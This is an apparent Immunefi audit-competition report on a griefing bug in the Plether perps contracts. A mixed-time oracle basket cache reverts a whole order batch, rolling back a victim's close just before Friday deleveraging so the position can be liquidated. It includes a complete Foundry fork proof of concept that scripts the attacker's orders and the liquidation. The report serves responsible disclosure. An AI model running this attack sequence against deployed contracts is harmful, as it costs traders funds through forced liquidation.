# \#99757 [SC-Medium] A historical basket cache can roll back a close before Friday deleveraging

**Submitted on Nov 15th 2026 at 05:51:10 UTC by @unineko for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99757
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Summary

**Severity: Medium — griefing under the [Plether competition scope](https://immunefi.com/audit-competition/plether/scope/).** A mixed-time historical six-feed basket can successfully price the first order in a FIFO batch, then make its own transaction-local cache fail when the next order reuses it. The resulting revert rolls back the first order. A trader whose valid close is first in that batch can therefore remain exposed across the scheduled Friday LIVE-to-FAD transition. In the fork PoC, liquidation at an unchanged price leaves the trader's settlement balance **24.319671 USDG lower** than a timely close, and credits **5 USDG** to the liquidator.

## Finding Description

[PletherOracle.\_resolveHistoricalOrderBasket()](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L596-L635) checks stored Pyth coverage against **each parsed feed's own publish time**. Basket construction assigns the basket's publish time the **newest** component time ([PletherOracle.sol](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L848-L875)). After the first order resolves, [updateBatchOrderExecutionPrice()](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L250-L299) caches that basket. Reuse checks **every** stored feed against the basket's newest time. A successful first resolution can therefore create a cache that immediately reverts with `PletherOracle__StoredFeedBehind` on the next order.

[OrderRouterExecutionSidecar.\_canReuseHistoricalBatchBasket()](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterExecutionSidecar.sol#L1074-L1093) checks commitment and settlement windows, but not the per-feed stored coverage needed by Oracle reuse. The Router chooses the zero-fee cache path in [\_prepareBatchOracle()](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterExecutionSidecar.sol#L982-L1036). `StoredFeedBehind` escapes the per-order rollback frame, reverting the **whole batch**, including the previously processed close.

The PoC places a victim's 60-second, LIVE-only close first and an attacker-controlled order second. The attacker commits in a later L2 block with the same Unix-second commitment time. Five feeds' first eligible update is at t+1; one feed's first eligible update is at t+3, with its previous publish time t. The two-second component spread is within the configured five-second divergence bound. At the final LIVE second, both orders execute sequentially from the same starting state. In a two-order batch, the victim close resolves first, the second order takes the cache path, and the early feeds' stored times remain below the cached t+3; the revert restores the still-open victim position.

This is a regression in cache eligibility. [PR #103](https://github.com/Plether-Fi/plether-core/pull/103) discussed generic batch rollback on failed cache coverage, while the cache marker then represented the **oldest** component, already covered by a successful per-feed check. [PR #120](https://github.com/Plether-Fi/plether-core/pull/120) changed that marker to the **newest** component without making initial coverage or the Router's reuse decision match it. The distinct failure here is a cache produced by a **successful first parse** that fails on its immediate same-commit reuse.

## Impact Explanation

Friday FAD raises the applicable liquidation margin requirement while the mark can remain unchanged ([CfdEnginePlanLib.sol](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L1440-L1467)). Let B be the Friday FAD start, 2026-11-13 21:30:00 UTC in the PoC. The fork PoC positions the batch at B−1, the last LIVE second. Although the close has a 60-second deadline, its LIVE-only mode makes this the final second in which it can execute. A read-only liquidation preview finds the position **solvent at B−1 and liquidatable at B at the same 100,000,000 mark**. In the control branch, the victim close executes and the victim's clearinghouse balance is **9,991.432887 USDG**. In the attack branch, the batch reverts; at FAD the LIVE-only close is terminalized as mode-disallowed, and a public liquidation executes at that unchanged mark. The victim's balance is then **9,967.113216 USDG**, a **24.319671 USDG** difference from the same pre-batch state. The liquidator receives **5 USDG** ([charge split](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/LiquidationAccountingLib.sol#L55-L78)). The balance difference is the net ledger consequence of the two settlement paths; the keeper credit is measured separately.

The direct cause is rollback of the close that would otherwise have completed before FAD. In the tested ordering, the failed batch is followed by liquidation at the mode boundary. The impact is **griefing through a missed timely close and its tested liquidation consequence**.

## Likelihood Explanation

The path requires two ready orders with reusable commitment times, a historical six-feed update with one delayed first eligible component, and batch execution near the scheduled LIVE-to-FAD boundary. A later-block attacker order can still share the victim's integer-second commitment time. The victim's 60-second window and LIVE-only execution mode follow the stock order settings. The current [reference keeper's batch selection](https://github.com/Plether-Fi/plether-app/blob/d31fd70f50b80495b484e02df9abb371dbc61122/apps/backend/src/Plether/Keeper.hs#L2533-L2567) chooses a batch for multiple ready orders and has no immediate singleton fallback after a failed preflight. The PoC uses a local fork of the v2.0.0 deployment and substitutes the external Pyth endpoint with MockPyth, as expressly allowed by the competition's [PoC rules](https://immunefi.com/audit-competition/plether/scope/).


## Recommendation

Cache a freshly resolved historical basket only when every stored feed reaches that basket's newest component publish time. Otherwise, make the next order take a funded fresh resolution. The Router's fee decision and the Oracle's cache-reuse decision should apply the same per-feed coverage criterion. Add a regression test with valid unequal component times, no preloaded newer storage, and two same-commit orders; batch execution should preserve the first order's terminal result instead of reverting it.


## Proof of Concept

## Proof of Concept

The standalone [Finding 11 fork PoC](../../packages/perps/test/perps/finding11_poc.t.sol) pins Arbitrum Sepolia block 328687760, checks the deployed Router and Oracle runtime hashes, and supplies a deterministic mixed-time history through the external MockPyth. It verifies that the earlier five-feed-only payload cannot settle either order, that both orders execute singly at the final LIVE second, and that the same orders revert as one batch. It then checks the unchanged-price FAD eligibility transition, the mode-disallowed close, the victim balance difference after liquidation, and the liquidator credit.

From packages/perps, run with an archive-capable Arbitrum Sepolia RPC:

```sh
FINDING11_FORK_RPC_URL=https://arbitrum-sepolia.gateway.tenderly.co forge test --match-path test/perps/finding11_poc.t.sol -vv
```

Verified result: testFinding11_StockLiveToFadRollbackThenLiquidation passed (1/1; 0 failed).

Selected verified output (USDG atoms; six decimals):

```text
[PASS] testFinding11_StockLiveToFadRollbackThenLiquidation()
Logs:
  timelyCloseVictimBalance: 9991432887
  liquidatedVictimBalance: 9967113216
  victimBalanceDifference: 24319671
  attackerLiquidatorCredit: 5000000
Suite result: ok. 1 passed; 0 failed; 0 skipped
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {CfdEngine} from "@plether/perps/CfdEngine.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {MarginClearinghouse} from "@plether/perps/MarginClearinghouse.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {ICfdEngineLens} from "@plether/perps/interfaces/ICfdEngineLens.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {IPletherOracle} from "@plether/perps/interfaces/IPletherOracle.sol";
import {ArbitrumForkSupport} from "@plether/test-utils/ArbitrumForkSupport.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {Test} from "forge-std/Test.sol";

interface IFinding11MintableUSDG is IERC20 {

    function mint(
        address to,
        uint256 amount
    ) external;

}

/// @notice A mixed-time historical basket can roll back a valid close immediately
///         before FAD, leaving a thinly margined position open for liquidation.
/// @dev Run from packages/perps:
///      FOUNDRY_TEST=test/perps FINDING11_FORK_RPC_URL=https://arbitrum-sepolia.gateway.tenderly.co forge test \
///        --match-path test/perps/finding11_poc.t.sol -vv --ignored-error-codes 6335 \
///        -o /tmp/plether-f11-out --cache-path /tmp/plether-f11-cache
///      Only the out-of-scope Pyth endpoint is replaced with MockPyth. The local
///      ArbSys shim supports the fork. In-scope contracts and USDG are unchanged.
contract Finding11ForkPoC is Test {

    address private constant ATTACKER = address(0xA11CE);
    address private constant VICTIM = address(0xB0B);

    address private constant ROUTER = 0x918663D6Da8CB33b325a04c4A5e8c51D42F3b444;
    address private constant ORACLE = 0x4f2c62A0E03657F52C633c19c11f88d8F0897Bb2;
    address private constant CLEARINGHOUSE = 0xB5B851f627d6Df3CF3F096E23e20a58884D7b89A;
    address private constant ENGINE = 0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA;
    address private constant USDG = 0x3d051DbBf5Ff427a4aE8Ad09746902666Af8FB9D;
    bytes32 private constant ROUTER_CODEHASH = 0x6c65de67ef2824572537e3641a71100100c49d909b196c43e5d271312534d3cf;
    bytes32 private constant ORACLE_CODEHASH = 0x1ecb1ca760e7ba51d958697eeefe06ff7ba1a3ad162b3e7978af3df30393bc13;

    uint256 private constant FEE = 1 gwei;
    uint256 private constant FORK_BLOCK = 328_687_760;
    uint64 private constant FRIDAY_FAD_START = 1_794_605_400; // 2026-11-13 21:30 UTC.
    uint256 private constant NEUTRAL_MARK = 100_000_000; // 8 decimals.

    OrderRouter private router;
    PletherOracle private oracle;
    MarginClearinghouse private clearinghouse;
    MockPyth private pyth;
    IFinding11MintableUSDG private usdg;

    function setUp() public {
        vm.createSelectFork(
            vm.envOr("FINDING11_FORK_RPC_URL", string("https://arbitrum-sepolia.gateway.tenderly.co")), FORK_BLOCK
        );
        assertEq(block.chainid, 421_614, "must be an Arbitrum Sepolia fork");
        assertEq(ROUTER.codehash, ROUTER_CODEHASH, "unexpected release Router code");
        assertEq(ORACLE.codehash, ORACLE_CODEHASH, "unexpected release Oracle code");
        ArbitrumForkSupport.install();

        router = OrderRouter(payable(ROUTER));
        oracle = PletherOracle(payable(ORACLE));
        clearinghouse = MarginClearinghouse(CLEARINGHOUSE);
        usdg = IFinding11MintableUSDG(USDG);
        assertEq(address(router.pletherOracle()), ORACLE, "unexpected deployed router");

        address pythAddress = address(oracle.pyth());
        MockPyth mockImplementation = new MockPyth();
        vm.etch(pythAddress, address(mockImplementation).code);
        pyth = MockPyth(pythAddress);
        pyth.setFee(FEE);

        // Expire the fork's existing 60-second orders while remaining in LIVE mode.
        _advance(uint64(vm.getBlockTimestamp() + 120));
        for (uint256 i; i < 100 && router.nextExecuteId() != 0; ++i) {
            router.expireOrder(router.nextExecuteId());
        }
        assertEq(router.nextExecuteId(), 0, "pre-existing queue did not clear");

        vm.deal(address(this), 1 ether);
        uint64 now_ = uint64(vm.getBlockTimestamp());
        router.updateMarkPrice{value: FEE}(_priceUpdates(now_, now_ - 1, false));
        _fund(ATTACKER);
        _fund(VICTIM);
    }

    function testFinding11_StockLiveToFadRollbackThenLiquidation() public {
        CfdEngine engine = CfdEngine(ENGINE);
        uint64 openingTime = uint64(vm.getBlockTimestamp());
        uint64 victimOpen = _commitOpen(VICTIM, 200e6);
        _advance(openingTime + 1);
        assertEq(
            uint8(
                router.executeOrder{value: 2 * FEE}(
                    victimOpen, _priceUpdates(openingTime + 1, openingTime, false)
                )
                .status
            ),
            uint8(OrderV3Types.LifecycleStatus.Executed)
        );
        (uint256 openedSize,,,,,,) = engine.positions(VICTIM);
        assertEq(openedSize, 10_000e18, "victim has an open position");

        uint64 commitTime = FRIDAY_FAD_START - 4;
        _advance(commitTime);
        router.updateMarkPrice{value: FEE}(_priceUpdates(commitTime, commitTime - 1, false));
        assertEq(engine.lastMarkPrice(), NEUTRAL_MARK, "neutral mark before close");
        assertLt(engine.lastMarkPrice(), engine.CAP_PRICE(), "not a capped-price artifact");
        assertFalse(engine.isFadWindow(), "still in LIVE mode");

        uint64 victimClose = _commitClose(VICTIM);
        uint256 victimCommitBlock = block.number;
        vm.roll(victimCommitBlock + 1);
        assertEq(vm.getBlockTimestamp(), commitTime, "attacker commits in a later block of the same second");
        uint64 attackerOpen = _commitOpen(ATTACKER, 1000e6);
        assertEq(router.lifecycleBook().orderTiming(victimClose).commitTimestamp, commitTime);
        assertEq(router.lifecycleBook().orderTiming(attackerOpen).commitTimestamp, commitTime);
        assertEq(router.lifecycleBook().orderTiming(victimClose).executionDeadline, commitTime + 60);

        // Five feeds first publish at commitTime+1; feed 0 first publishes at
        // commitTime+3. Both are eligible for the same historical commitment.
        bytes[] memory mixedHistory = _priceUpdates(FRIDAY_FAD_START - 1, commitTime, true);
        bytes32 earlyFeed = oracle.pythFeedIds(1);
        bytes[] memory earlyHistory = _earlyPriceUpdates(commitTime + 1, commitTime);
        for (uint64 second = commitTime + 1; second < FRIDAY_FAD_START - 1; ++second) {
            _advance(second);
            assertEq(
                uint8(router.executeOrder{value: 2 * FEE}(victimClose, earlyHistory).status),
                uint8(OrderV3Types.LifecycleStatus.Pending),
                "five feeds cannot settle the victim close"
            );
            assertEq(
                router.executeOrderBatch{value: 4 * FEE}(attackerOpen, earlyHistory).terminalCount,
                0,
                "five feeds cannot settle the batch"
            );
            assertEq(router.nextExecuteId(), victimClose, "no earlier fill occurred");
        }
        _advance(FRIDAY_FAD_START - 1);
        assertFalse(_isLiquidatableAtNeutralMark(), "position is solvent immediately before FAD");
        uint256 beforeBatch = vm.snapshotState();

        // The valid first order settles when executed alone.
        assertEq(
            uint8(router.executeOrder{value: 2 * FEE}(victimClose, mixedHistory).status),
            uint8(OrderV3Types.LifecycleStatus.Executed)
        );
        (uint256 sizeAfterTimelyClose,,,,,,) = engine.positions(VICTIM);
        assertEq(sizeAfterTimelyClose, 0);
        uint256 timelyCloseBalance = clearinghouse.balanceAssets(VICTIM);
        assertEq(engine.lastMarkPrice(), NEUTRAL_MARK, "same mark for timely close");
        assertEq(
            uint8(router.executeOrder{value: 2 * FEE}(attackerOpen, mixedHistory).status),
            uint8(OrderV3Types.LifecycleStatus.Executed),
            "second order also executes without batch-cache reuse"
        );
        assertTrue(vm.revertToState(beforeBatch));

        // The following attacker order reuses the first basket's maximum time.
        // Stored early feeds are behind that time, reverting the entire batch.
        vm.expectRevert(
            abi.encodeWithSelector(
                IPletherOracle.PletherOracle__StoredFeedBehind.selector,
                earlyFeed,
                FRIDAY_FAD_START - 3,
                FRIDAY_FAD_START - 1
            )
        );
        router.executeOrderBatch{value: 4 * FEE}(attackerOpen, mixedHistory);
        assertEq(router.nextExecuteId(), victimClose, "first close rolled back");
        assertEq(
            uint8(router.lifecycleBook().lifecycleStatus(victimClose)), uint8(OrderV3Types.LifecycleStatus.Pending)
        );
        (uint256 sizeAfterFailedBatch,,,,,,) = engine.positions(VICTIM);
        assertEq(sizeAfterFailedBatch, 10_000e18, "position remains open after rollback");
        assertEq(engine.lastMarkPrice(), NEUTRAL_MARK, "batch did not move mark");

        _advance(FRIDAY_FAD_START);
        assertTrue(engine.isFadWindow(), "scheduled FAD has begun");
        assertFalse(engine.isOracleFrozen(), "liquidation uses current oracle price");
        assertTrue(_isLiquidatableAtNeutralMark(), "higher FAD margin makes position liquidatable");
        OrderV3Types.ExecutionResult memory rejectedClose =
            router.executeOrder{value: 2 * FEE}(victimClose, mixedHistory);
        assertEq(uint8(rejectedClose.status), uint8(OrderV3Types.LifecycleStatus.Failed));
        assertEq(uint8(rejectedClose.terminalReason), uint8(OrderV3Types.TerminalReason.ExecutionModeDisallowed));
        assertEq(
            uint8(router.lifecycleBook().lifecycleStatus(victimClose)),
            uint8(OrderV3Types.LifecycleStatus.Failed),
            "close is terminal after LIVE ends"
        );

        uint256 attackerBefore = clearinghouse.balanceAssets(ATTACKER);
        bytes[] memory current = _priceUpdates(FRIDAY_FAD_START, FRIDAY_FAD_START - 1, false);
        vm.deal(ATTACKER, 1 ether);
        vm.prank(ATTACKER);
        router.executeLiquidation{value: FEE}(VICTIM, current);
        assertEq(engine.lastMarkPrice(), NEUTRAL_MARK, "no price move caused liquidation");
        (uint256 sizeAfterLiquidation,,,,,,) = engine.positions(VICTIM);
        assertEq(sizeAfterLiquidation, 0, "victim was liquidated at the mode transition");

        uint256 liquidatedBalance = clearinghouse.balanceAssets(VICTIM);
        uint256 liquidatorCredit = clearinghouse.balanceAssets(ATTACKER) - attackerBefore;
        assertEq(timelyCloseBalance - liquidatedBalance, 24_319_671, "victim balance difference in USDG atoms");
        assertEq(liquidatorCredit, 5e6, "attacker receives 5 USDG liquidation credit");
        emit log_named_uint("timelyCloseVictimBalance", timelyCloseBalance);
        emit log_named_uint("liquidatedVictimBalance", liquidatedBalance);
        emit log_named_uint("victimBalanceDifference", timelyCloseBalance - liquidatedBalance);
        emit log_named_uint("attackerLiquidatorCredit", liquidatorCredit);
    }

    function _fund(
        address trader
    ) private {
        usdg.mint(trader, 10_000e6);
        vm.startPrank(trader);
        usdg.approve(CLEARINGHOUSE, 10_000e6);
        clearinghouse.deposit(trader, 10_000e6);
        vm.stopPrank();
    }

    function _commitOpen(
        address trader,
        uint256 margin
    ) private returns (uint64 orderId) {
        OrderV3Types.OrderRequest memory request;
        request.clientOrderId = keccak256(abi.encode("finding11-open", trader, router.nextCommitId()));
        request.side = CfdTypes.Side.LONG;
        request.sizeDelta = 10_000e18;
        request.marginDelta = margin;
        request.targetPrice = 1;
        request.bounds = _bounds();
        vm.prank(trader);
        orderId = router.commitOrder(request);
    }

    function _commitClose(
        address trader
    ) private returns (uint64 orderId) {
        OrderV3Types.OrderRequest memory request;
        request.clientOrderId = keccak256(abi.encode("finding11-close", trader, router.nextCommitId()));
        request.side = CfdTypes.Side.LONG;
        request.sizeDelta = 10_000e18;
        request.targetPrice = CfdEngine(ENGINE).CAP_PRICE();
        request.isClose = true;
        request.bounds = _bounds();
        vm.prank(trader);
        orderId = router.commitOrder(request);
    }

    function _bounds() private view returns (OrderV3Types.ExecutionBounds memory bounds) {
        bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + 60),
            executionWindowSeconds: 60,
            allowedExecutionModes: 1, // Stock LIVE-only mode.
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _priceUpdates(
        uint64 tick,
        uint64 previous,
        bool mixed
    ) private view returns (bytes[] memory data) {
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](6);
        for (uint256 i; i < 6; ++i) {
            uint256 base = oracle.basePrices(i);
            uint256 raw = oracle.inversions(i) ? (1e16 + base / 2) / base : base;
            updates[i] = MockPyth.FeedUpdate(
                oracle.pythFeedIds(i),
                MockPyth.MockPrice(int64(uint64(raw)), 0, -8, mixed && i != 0 ? previous + 1 : tick, previous)
            );
        }
        data = new bytes[](1);
        data[0] = abi.encode(updates);
    }

    function _earlyPriceUpdates(
        uint64 tick,
        uint64 previous
    ) private view returns (bytes[] memory data) {
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](5);
        for (uint256 i = 1; i < 6; ++i) {
            uint256 base = oracle.basePrices(i);
            uint256 raw = oracle.inversions(i) ? (1e16 + base / 2) / base : base;
            updates[i - 1] = MockPyth.FeedUpdate(
                oracle.pythFeedIds(i), MockPyth.MockPrice(int64(uint64(raw)), 0, -8, tick, previous)
            );
        }
        data = new bytes[](1);
        data[0] = abi.encode(updates);
    }

    function _advance(
        uint64 timestamp
    ) private {
        vm.warp(timestamp);
        vm.roll(block.number + 1);
    }

    function _isLiquidatableAtNeutralMark() private view returns (bool) {
        ICfdEngineTypes.LiquidationPreview memory preview =
            ICfdEngineLens(router.engineLensForCommit()).previewLiquidation(VICTIM, NEUTRAL_MARK);
        return preview.liquidatable;
    }

}
```
